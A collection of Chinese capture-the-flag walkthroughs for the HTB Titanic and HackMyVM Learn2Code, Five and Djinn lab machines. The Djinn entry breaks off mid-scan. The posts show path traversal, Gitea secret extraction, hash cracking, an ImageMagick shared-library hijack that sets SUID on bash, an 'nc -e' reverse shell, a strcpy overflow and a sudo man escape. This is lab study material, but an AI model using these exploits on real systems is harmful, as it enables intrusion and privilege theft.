[{"title":"HTB-Titanic","url":"/2025/05/09/HTB-Titanic/","content":"\n# 信息搜集\n\n~~~\nroot@kali:~# rustscan -a 10.10.11.55\n.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.\n| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |\n| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |\n`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'\nThe Modern Day Port Scanner.\n________________________________________\n: https://discord.gg/GFrQsGy           :\n: https://github.com/RustScan/RustScan :\n --------------------------------------\nNmap? More like slowmap.🐢\n\n[~] The config file is expected to be at \"/root/.rustscan.toml\"\n[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers\n[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. \nOpen 10.10.11.55:22\nOpen 10.10.11.55:80\n[~] Starting Script(s)\n[>] Script to be run Some(\"nmap -vvv -p {{port}} {{ip}}\")\n\n[~] Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-09 08:25 UTC\nInitiating Ping Scan at 08:25\nScanning 10.10.11.55 [4 ports]\nCompleted Ping Scan at 08:25, 0.18s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 08:25\nCompleted Parallel DNS resolution of 1 host. at 08:25, 0.00s elapsed\nDNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]\nInitiating SYN Stealth Scan at 08:25\nScanning 10.10.11.55 [2 ports]\nDiscovered open port 80/tcp on 10.10.11.55\nDiscovered open port 22/tcp on 10.10.11.55\nCompleted SYN Stealth Scan at 08:25, 0.52s elapsed (2 total ports)\nNmap scan report for 10.10.11.55\nHost is up, received echo-reply ttl 63 (0.26s latency).\nScanned at 2025-05-09 08:25:00 UTC for 1s\n\nPORT   STATE SERVICE REASON\n22/tcp open  ssh     syn-ack ttl 63\n80/tcp open  http    syn-ack ttl 63\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.83 seconds\n           Raw packets sent: 6 (240B) | Rcvd: 6 (236B\n~~~\n\n开放了22和80端口\n\n80端口会自动跳转`titanic.htb`域名，添加一下host\n\n~~~\n10.10.11.55 titanic.htb\n~~~\n\n枚举一下子域名可以发现有一个`dev`,同样添加进去\n\n~~~\n10.10.11.55 titanic.htb dev.titanic.htb\n~~~\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hw 28 -u \"http://10.10.\n11.55\" -H \"Host: FUZZ.titanic.htb\"\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://10.10.11.55/\nTotal requests: 220559\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload\n=====================================================================\n\n000000001:   400        10 L     35 W       303 Ch      \"# directory-list-2.3-medium.txt\"\n000000003:   400        10 L     35 W       303 Ch      \"# Copyright 2007 James Fisher\"\n000000007:   400        10 L     35 W       303 Ch      \"# license, visit http://creativecommons.org/licenses/b\n                                                        y-sa/3.0/\"\n000000010:   400        10 L     35 W       303 Ch      \"#\"\n000000011:   400        10 L     35 W       303 Ch      \"# Priority ordered case-sensitive list, where entries\n                                                        were found\"\n000000009:   400        10 L     35 W       303 Ch      \"# Suite 300, San Francisco, California, 94105, USA.\"\n000000005:   400        10 L     35 W       303 Ch      \"# This work is licensed under the Creative Commons\"\n000000013:   400        10 L     35 W       303 Ch      \"#\"\n000000008:   400        10 L     35 W       303 Ch      \"# or send a letter to Creative Commons, 171 Second Str\n                                                        eet,\"\n000000006:   400        10 L     35 W       303 Ch      \"# Attribution-Share Alike 3.0 License. To view a copy\n                                                        of this\"\n000000012:   400        10 L     35 W       303 Ch      \"# on at least 2 different hosts\"\n000000002:   400        10 L     35 W       303 Ch      \"#\"\n000000004:   400        10 L     35 W       303 Ch      \"#\"\n000000834:   200        275 L    1278 W     13870 Ch    \"dev\"\n~~~\n\n# 80端口\n\n点击右上角的booknow后填写完信息，然后抓包，可以发现一个download的一个路由，将其修改成\n\n~~~php\n/download?ticket=/etc/passwd\n~~~\n\n发现可以进行任意文件读取,可以直接读取user.txt\n\n~~~\n/download?ticket=/home/developer/user.txt\n~~~\n\n# Gitea\n\n前面的`dev.titanic.htb`是一个gitea的网站，版本是`1.22.1 `,点击左上角的探索跳转到了一个仓库，然后有gitea和mysql的docker-compose.yml文件\n\n~~~\n#gitea\nversion: '3'\n\nservices:\n  gitea:\n    image: gitea/gitea\n    container_name: gitea\n    ports:\n      - \"127.0.0.1:3000:3000\"\n      - \"127.0.0.1:2222:22\"  # Optional for SSH access\n    volumes:\n      - /home/developer/gitea/data:/data # Replace with your path\n    environment:\n      - USER_UID=1000\n      - USER_GID=1000\n    restart: always\n~~~\n\n~~~\n#mysql\nversion: '3.8'\n\nservices:\n  mysql:\n    image: mysql:8.0\n    container_name: mysql\n    ports:\n      - \"127.0.0.1:3306:3306\"\n    environment:\n      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'\n      MYSQL_DATABASE: tickets \n      MYSQL_USER: sql_svc\n      MYSQL_PASSWORD: sql_password\n    restart: always\n~~~\n\n可以知道gitea的路径和mysql的密码，gitea的配置文件默认在`/etc/gitea/conf/app.ini`这里可能是在`/home/developer/gitea/conf/app.ini`不对，那就是`/home/developer/gitea/data/gitea/conf/app.ini`这下对了\n\n~~~\nPP_NAME = Gitea: Git with a cup of tea\nRUN_MODE = prod\nRUN_USER = git\nWORK_PATH = /data/gitea\n\n[repository]\nROOT = /data/git/repositories\n\n[repository.local]\nLOCAL_COPY_PATH = /data/gitea/tmp/local-repo\n\n[repository.upload]\nTEMP_PATH = /data/gitea/uploads\n\n[server]\nAPP_DATA_PATH = /data/gitea\nDOMAIN = gitea.titanic.htb\nSSH_DOMAIN = gitea.titanic.htb\nHTTP_PORT = 3000\nROOT_URL = http://gitea.titanic.htb/\nDISABLE_SSH = false\nSSH_PORT = 22\nSSH_LISTEN_PORT = 22\nLFS_START_SERVER = true\nLFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4\nOFFLINE_MODE = true\n\n[database]\nPATH = /data/gitea/gitea.db\nDB_TYPE = sqlite3\nHOST = localhost:3306\nNAME = gitea\nUSER = root\nPASSWD = \nLOG_SQL = false\nSCHEMA = \nSSL_MODE = disable\n\n[indexer]\nISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve\n\n[session]\nPROVIDER_CONFIG = /data/gitea/sessions\nPROVIDER = file\n\n[picture]\nAVATAR_UPLOAD_PATH = /data/gitea/avatars\nREPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars\n\n[attachment]\nPATH = /data/gitea/attachments\n\n[log]\nMODE = console\nLEVEL = info\nROOT_PATH = /data/gitea/log\n\n[security]\nINSTALL_LOCK = true\nSECRET_KEY = \nREVERSE_PROXY_LIMIT = 1\nREVERSE_PROXY_TRUSTED_PROXIES = *\nINTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8\nPASSWORD_HASH_ALGO = pbkdf2\n\n[service]\nDISABLE_REGISTRATION = false\nREQUIRE_SIGNIN_VIEW = false\nREGISTER_EMAIL_CONFIRM = false\nENABLE_NOTIFY_MAIL = false\nALLOW_ONLY_EXTERNAL_REGISTRATION = false\nENABLE_CAPTCHA = false\nDEFAULT_KEEP_EMAIL_PRIVATE = false\nDEFAULT_ALLOW_CREATE_ORGANIZATION = true\nDEFAULT_ENABLE_TIMETRACKING = true\nNO_REPLY_ADDRESS = noreply.localhost\n\n[lfs]\nPATH = /data/git/lfs\n\n[mailer]\nENABLED = false\n\n[openid]\nENABLE_OPENID_SIGNIN = true\nENABLE_OPENID_SIGNUP = true\n\n[cron.update_checker]\nENABLED = false\n\n[repository.pull-request]\nDEFAULT_MERGE_STYLE = merge\n\n[repository.signing]\nDEFAULT_TRUST_MODEL = committer\n\n[oauth2]\nJWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g\n\n~~~\n\n然后读取数据库文件，下载下来用navicat打开\n\n可以拿到developer的密码为e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56\n\n然后用脚本跑一下密码\n\n~~~python\nimport hashlib\nimport binascii\n \ndef pbkdf2_hash(password, salt, iterations=50000, dklen=50):\n    hash_value = hashlib.pbkdf2_hmac(\n        'sha256',\n        password.encode('utf-8'),\n        salt,\n        iterations,\n        dklen\n    )\n    return hash_value\n \ndef find_matching_password(dictionary_file, target_hash, salt, iterations=50000, dklen=50):\n    target_hash_bytes = binascii.unhexlify(target_hash)\n    \n    with open(dictionary_file, 'r', encoding='utf-8') as file:\n        count = 0\n        for line in file:\n            password = line.strip()\n            hash_value = pbkdf2_hash(password, salt, iterations, dklen)\n            count += 1\n            print(f\"正在检查密码 {count}: {password}\")\n            if hash_value == target_hash_bytes:\n                print(f\"\\nFound password: {password}\")\n                return password\n        print(\"Password not found.\")\n        return None\n \nsalt = binascii.unhexlify('8bf3e3452b78544f8bee9400d6936d34')\ntarget_hash = 'e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56'\ndictionary_file = '/usr/share/wordlists/rockyou.txt'\nfind_matching_password(dictionary_file, target_hash, salt)\n\n~~~\n\n可以爆破出来密码是`25282528`,ssh连接\n\n# 提权\n\n~~~\ndeveloper@titanic:~$ sudo -l\n[sudo] password for developer:\nSorry, user developer may not run sudo on titanic.\n~~~\n\nsudo没有东西\n\n~~~\ndeveloper@titanic:~$ find / -perm -u=s 2>/dev/null\n/snap/core20/2434/usr/bin/chfn\n/snap/core20/2434/usr/bin/chsh\n/snap/core20/2434/usr/bin/gpasswd\n/snap/core20/2434/usr/bin/mount\n/snap/core20/2434/usr/bin/newgrp\n/snap/core20/2434/usr/bin/passwd\n/snap/core20/2434/usr/bin/su\n/snap/core20/2434/usr/bin/sudo\n/snap/core20/2434/usr/bin/umount\n/snap/core20/2434/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core20/2434/usr/lib/openssh/ssh-keysign\n/snap/snapd/23545/usr/lib/snapd/snap-confine\n/usr/lib/snapd/snap-confine\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/libexec/polkit-agent-helper-1\n/usr/bin/chsh\n/usr/bin/newgrp\n/usr/bin/su\n/usr/bin/pkexec\n/usr/bin/sudo\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/chfn\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/fusermount3\n~~~\n\nsuid也没什么可以用的，在opt下有一个shell脚本\n\n~~~\ndeveloper@titanic:/opt/scripts$ cat identify_images.sh\ncd /opt/app/static/assets/images\ntruncate -s 0 metadata.log\nfind /opt/app/static/assets/images/ -type f -name \"*.jpg\" | xargs /usr/bin/magick identify >> metadata.log\n~~~\n\n~~~\ndeveloper@titanic:/opt/scripts$ magick --version\nVersion: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org\nCopyright: (C) 1999 ImageMagick Studio LLC\nLicense: https://imagemagick.org/script/license.php\nFeatures: Cipher DPC HDRI OpenMP(4.5)\nDelegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib\nCompiler: gcc (9.4)\n~~~\n\n版本号是7.1.1-35，网上一搜就能搜到有[漏洞](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)cd 进/opt/app/static/assets/images/\n\n然后输入\n\n~~~\ngcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\n__attribute__((constructor)) void init(){\n    system(\"cp /root/root.txt root.txt; chmod 754 root.txt\");\n    exit(0);\n}\nEOF\n~~~\n\n等一下就会cp root.txt进来，拿shell的话就是\n\n~~~\ngcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\n__attribute__((constructor)) void init(){\n    system(\"chmod +s /bin/bash\");\n    exit(0);\n}\nEOF\n~~~\n\n然后bash -p即可\n","tags":["靶机"],"categories":["HTB"]},{"title":"HackmyVM-Learn2Code","url":"/2025/05/08/HackmyVM-Learn2Code/","content":"\n# 信息搜集\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:80:63:b8       PCS Systemtechnik GmbH\n192.168.31.178  08:00:27:7c:36:6c       PCS Systemtechnik GmbH\n\n3 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.436 seconds (105.09 hosts/sec). 3 responded\n~~~\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# rustscan -a 192.168.31.178 -r 1-65535\n.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.\n| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |\n| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |\n`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'\nThe Modern Day Port Scanner.\n________________________________________\n: http://discord.skerritt.blog         :\n: https://github.com/RustScan/RustScan :\n --------------------------------------\nScanning ports faster than you can say 'SYN ACK'\n\n[~] The config file is expected to be at \"/root/.rustscan.toml\"\n[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 65435'.\nOpen 192.168.31.178:80\n[~] Starting Script(s)\n[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 01:29 EDT\nInitiating ARP Ping Scan at 01:29\nScanning 192.168.31.178 [1 port]\nCompleted ARP Ping Scan at 01:29, 0.07s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 01:29\nCompleted Parallel DNS resolution of 1 host. at 01:29, 0.05s elapsed\nDNS resolution of 1 IPs took 0.05s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]\nInitiating SYN Stealth Scan at 01:29\nScanning 192.168.31.178 [1 port]\nDiscovered open port 80/tcp on 192.168.31.178\nCompleted SYN Stealth Scan at 01:29, 0.02s elapsed (1 total ports)\nNmap scan report for 192.168.31.178\nHost is up, received arp-response (0.00031s latency).\nScanned at 2025-05-08 01:29:48 EDT for 0s\n\nPORT   STATE SERVICE REASON\n80/tcp open  http    syn-ack ttl 64\nMAC Address: 08:00:27:7C:36:6C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nRead data files from: /usr/share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.26 seconds\n           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)\n~~~\n\n只开了一个80端口\n\n# 80端口\n\n扫描一下目录\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# gobuster dir -u \"http://192.168.31.178/\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-m\nedium.txt -x .txt,.php,.html\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.178/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              html,txt,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.html                (Status: 403) [Size: 279]\n/.php                 (Status: 403) [Size: 279]\n/index.php            (Status: 200) [Size: 1161]\n/includes             (Status: 301) [Size: 319] [--> http://192.168.31.178/includes/]\n/todo.txt             (Status: 200) [Size: 51]\n/.html                (Status: 403) [Size: 279]\n/.php                 (Status: 403) [Size: 279]\n~~~\n\ntodo.txt:\n\n~~~\n\n******* Remember to delete the bak files!! *******\n~~~\n\n然后includes有目录便利可以看到access.php.bak:\n\n~~~\n<?php\n\trequire_once 'GoogleAuthenticator.php';\n\t$ga = new PHPGangsta_GoogleAuthenticator();\n\t$secret = \"S4I22IG3KHZIGQCJ\";\n\n\tif ($_POST['action'] == 'check_code') {\n\t\t$code = $_POST['code'];\n\t\t$result = $ga->verifyCode($secret, $code, 1);\n\n\t\tif ($result) {\n\t\t\tinclude('coder.php');\n\t\t} else {\n\t\t\techo \"wrong\";\n\t\t}\n\t}\n?>\n~~~\n\n这个验证码是通过`GoogleAuthenticator.php`检验的,谷歌有一个谷歌身份验证器，将这个密钥输入进去就可以得到验证码，输入验证码进入到输入code的页面，可以执行python代码，而且通过报错可以得知是用exec执行的代码\n\n~~~\n__import__('os').system('nc -e /bin/bash 192.168.31.129 4444')\n~~~\n\n反弹一个shell回来\n\n# 提权\n\n~~~\nwww-data@Learn2Code:/var/www/html/includes/php$ find / -perm -u=s 2>/dev/null\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/bin/chsh\n/usr/bin/mount\n/usr/bin/passwd\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/umount\n/usr/bin/gpasswd\n/usr/bin/MakeMeLearner\n/usr/bin/chfn\n~~~\n\n有一个`MakeMeLearner`很可疑下载下来，ida打开\n\n~~~\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  char dest[76]; // [rsp+10h] [rbp-50h] BYREF\n  int v5; // [rsp+5Ch] [rbp-4h]\n\n  if ( argc == 1 )\n    errx(1, \"please specify an argument\\n\", envp);\n  printf(\"Change the 'modified' variable value to '0x61626364' to be a learner\");\n  v5 = 0;\n  strcpy(dest, argv[1]);\n  if ( v5 == 1633837924 )\n  {\n    setuid(0x3E8u);\n    setgid(0x3E8u);\n    system(\"/bin/bash\");\n  }\n  else\n  {\n    printf(\"Try again, you got 0x%08x\\n\", v5);\n  }\n  return 0;\n}\n~~~\n\nstrcpy可以栈溢出，dest的大小是76输入77个a会发现\n\n~~~\nChange the 'modified' variable value to '0x61626364' to be a learnerTry again, you got 0x00000061\n~~~\n\n可以发现溢出到这里了他想要0x61626364,就输入dcba,因为他是小端序\n\n~~~\nChange the 'modified' variable value to '0x61626364' to be a learnerTry again, you got 0x00000061\n<aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadcba\nlearner@Learn2Code:/var/www/html/includes/php$\n~~~\n\n这样就拿到user了\n\n# 提权ROOT\n\nlearner的家目录有一个`MySecretPasswordVault`，下载下来看看\n\n~~~\n; Attributes: bp-based frame\n\n; int __fastcall main(int argc, const char **argv, const char **envp)\npublic main\nmain proc near\n\nvar_18= qword ptr -18h\nvar_10= qword ptr -10h\nvar_8= qword ptr -8\n\n; __unwind {\npush    rbp\nmov     rbp, rsp\nsub     rsp, 20h\nlea     rax, aNoi98ho   ; \"NOI98hO\"\nmov     [rbp+var_8], rax\nlea     rax, aIhj       ; \"Ihj\"\nmov     [rbp+var_10], rax\nlea     rax, aJj        ; \")(Jj\"\nmov     [rbp+var_18], rax\nlea     rdi, s          ; \"If you are a learner, i'm sure you know\"...\ncall    _puts\nmov     eax, 0\nleave\nretn\n; } // starts at 1135\nmain endp\n\n~~~\n\n~~~\nNOI98hOIhj)(Jj\n~~~\n\n这个就是root的密码\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"HackmyVM-Five","url":"/2025/05/07/HackmyVM-Five/","content":"\n# 信息搜集\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c: 29: ff: 66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a: 00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27: dd: ef: c8       PCS Systemtechnik GmbH\n192.168.31.177  08:00:27: fe: 58: c8       PCS Systemtechnik GmbH\n\n3 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.411 seconds (106.18 hosts/sec). 3 responded\n~~~\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# rustscan -a 192.168.31.177 -r 1-65535\n.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.\n| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |\n| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |\n`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'\nThe Modern Day Port Scanner.\n________________________________________\n: http://discord.skerritt.blog         :\n: https://github.com/RustScan/RustScan :\n --------------------------------------\nTCP handshake? More like a friendly high-five!\n\n[~] The config file is expected to be at \"/root/.rustscan.toml\"\n[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 65435'.\nOpen 192.168.31.177:80\n[~] Starting Script(s)\n[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-07 01:31 EDT\nInitiating ARP Ping Scan at 01:31\nScanning 192.168.31.177 [1 port]\nCompleted ARP Ping Scan at 01:31, 0.04s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 01:31\nCompleted Parallel DNS resolution of 1 host. at 01:31, 0.04s elapsed\nDNS resolution of 1 IPs took 0.04s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]\nInitiating SYN Stealth Scan at 01:31\nScanning 192.168.31.177 [1 port]\nDiscovered open port 80/tcp on 192.168.31.177\nCompleted SYN Stealth Scan at 01:31, 0.02s elapsed (1 total ports)\nNmap scan report for 192.168.31.177\nHost is up, received arp-response (0.00042s latency).\nScanned at 2025-05-07 01:31:14 EDT for 0s\n\nPORT   STATE SERVICE REASON\n80/tcp open  http    syn-ack ttl 64\nMAC Address: 08:00:27:FE:58:C8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nRead data files from: /usr/share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.20 seconds\n           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)\n~~~\n\n只开启了一个80端口\n\n# 80端口\n\n首页是403，扫描一下目录\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# gobuster dir -u \"http://192.168.31.177\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .txt,.php,.html\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.177\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              txt,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/uploads              (Status: 301) [Size: 185] [--> http://192.168.31.177/uploads/]\n/admin                (Status: 301) [Size: 185] [--> http://192.168.31.177/admin/]\n/upload.php           (Status: 200) [Size: 48]\n/robots.txt           (Status: 200) [Size: 17]\n/upload.html          (Status: 200) [Size: 346]\n~~~\n\n`/robots.txt`让访问`/admin`，还有一个`upload.html`可以上传文件，上传上后访问uploads/rev.php，会显示403，上bp抓个包看看\n\n~~~\n------WebKitFormBoundaryRK8GGBtt0YpPaKBf\nContent-Disposition: form-data; name=\"directory\"\n\nuploads/\n------WebKitFormBoundaryRK8GGBtt0YpPaKBf\nContent-Disposition: form-data; name=\"submit\"\n\nUpload File\n------WebKitFormBoundaryRK8GGBtt0YpPaKBf--\n~~~\n\n请求体中有一个上传路径，给uploads删了看看，然后访问/rev.php，可以访问了，监听端口，反弹shell出来\n\n# 提权melisa\n\n~~~\nwww-data@five:/$ sudo -l\nMatching Defaults entries for www-data on five:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on five:\n    (melisa) NOPASSWD: /bin/cp\n~~~\n\n~~~\nwww-data@five:/tmp$ ss -lntup\nNetid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port\n\nudp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*\n\ntcp     LISTEN   0        128            127.0.0.1:4444          0.0.0.0:*\n\ntcp     LISTEN   0        128              0.0.0.0:80            0.0.0.0:*       users:((\"nginx\",pid=409,fd=6))\n\ntcp     LISTEN   0        128                 [::]:80               [::]:*       users:((\"nginx\",pid=409,fd=7))\n~~~\n\n~~~\nwww-data@five:/tmp$ nc 127.0.0.1 4444\nSSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2\n~~~\n\n可以看到4444端口是ssh端口，用socat将端口转发出来\n\n~~~\nsocat TCP-LISTEN:4445,fork TCP4:127.0.0.1:4444 &\n~~~\n\n然后cp一个公钥进去\n\n~~~\nwww-data@five:/tmp$ ls\nauthorized_keys\nsystemd-private-51833796905d4c16b06d8f390a64e61b-systemd-timesyncd.service-LEvzQE\nuser.txt\nwww-data@five:/tmp$ sudo -u melisa cp ./authorized_keys /home/melisa/.ssh\n~~~\n\n# 提权ROOT\n\n~~~\nmelisa@five:~$ sudo -l\nMatching Defaults entries for melisa on five:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser melisa may run the following commands on five:\n    (ALL) SETENV: NOPASSWD: /bin/pwd, /bin/arch, /bin/man, /bin/id, /bin/rm, /bin/clear\n~~~\n\n可以以root用户运行man\n\n~~~\nsudo man man\n!/bin/sh\n~~~\n\n这个不行，原因是因为分页用的是pager\n\n~~~\n   Controlling formatted output\n       -P pager, --pager=pager\n              Specify  which  output  pager  to use.  By default, man uses pager, falling back to cat if pager is not\n              found or is not executable.  This option overrides the $MANPAGER environment variable,  which  in  turn\n              overrides the $PAGER environment variable.  It is not used in conjunction with -f or -k.\n\n              The  value  may  be a simple command name or a command with arguments, and may use shell quoting (back‐\n              slashes, single quotes, or double quotes).  It may not use pipes to connect multiple commands;  if  you\n              need  that,  use a wrapper script, which may take the file to display either as an argument or on stan‐\n              dard input.\n~~~\n\n指定less作为分页用的命令就行\n\n~~~\nmelisa@five:~$ sudo man -P less id\n!bash\n~~~\n\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"HackmyVM-Djinn","url":"/2025/05/06/HackmyVM-Djinn/","content":"\n# 信息搜集\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:e7:50:e0       PCS Systemtechnik GmbH\n192.168.31.176  08:00:27:36:b4:d6       PCS Systemtechnik GmbH\n\n3 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 3.098 seconds (82.63 hosts/sec). 3 respondeds\n~~~\n\n192.168.31.176是靶机ip\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp/tmp]\n└─# rustscan -a 192.168.31.176 -r 1-65535\n.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.\n| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |\n| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |\n`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'\nThe Modern Day Port Scanner.\n________________________________________\n: http://discord.skerritt.blog         :\n: https://github.com/RustScan/RustScan :\n --------------------------------------\nPlease contribute more quotes to our GitHub https://github.com/rustscan/rustscan\n\n[~] The config file is expected to be at \"/root/.rustscan.toml\"\n[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 65435'.\nOpen 192.168.31.176:21\nOpen 192.168.31.176:1337\nOpen 192.168.31.176:7331\n[~] Starting Script(s)\n[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-06 04:49 EDT\nInitiating ARP Ping Scan at 04:49\nScanning 192.168.31.176 [1 port]\nCompleted ARP Ping Scan at 04:49, 0.07s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 04:49\nCompleted Parallel DNS resolution of 1 host. at 04:49, 0.04s elapsed\nDNS resolution of 1 IPs took 0.04s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]\nInitiating SYN 